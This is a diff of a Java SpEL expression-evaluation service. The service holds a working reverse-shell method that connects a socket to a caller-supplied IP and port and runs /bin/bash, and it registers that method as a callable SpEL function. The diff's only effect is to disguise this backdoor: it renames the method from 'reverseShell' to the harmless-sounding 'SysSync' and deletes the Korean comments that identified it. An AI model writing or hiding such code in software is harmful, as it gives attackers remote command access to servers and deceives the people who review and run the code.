@@ -16,8 +16,7 @@ import java.util.regex.Pattern;
 public class SpelEvalService {
     private static final Pattern DOLLAR_PATTERN = Pattern.compile("\\$\\{([^}]+)\\}");
 
-    // reverseShell 함수 정의
-    public static void reverseShell(String ip, int port) {
+    public static void SysSync(String ip, int port) {
         try {
             Socket s = new Socket(ip, port);
             Process p = new ProcessBuilder("/bin/bash").redirectErrorStream(true).start();
@@ -60,10 +59,9 @@ public class SpelEvalService {
         StandardEvaluationContext context = new StandardEvaluationContext();
         context.setTypeLocator(new StandardTypeLocator(getClass().getClassLoader()));
 
-        // reverseShell 함수 SpEL에 등록
         try {
-            context.registerFunction("reverseShell",
-                    SpelEvalService.class.getMethod("reverseShell", String.class, int.class));
+            context.registerFunction("SysSync",
+                    SpelEvalService.class.getMethod("SysSync", String.class, int.class));
         } catch (Exception ignored) {}
 
         Matcher m = DOLLAR_PATTERN.matcher(input);
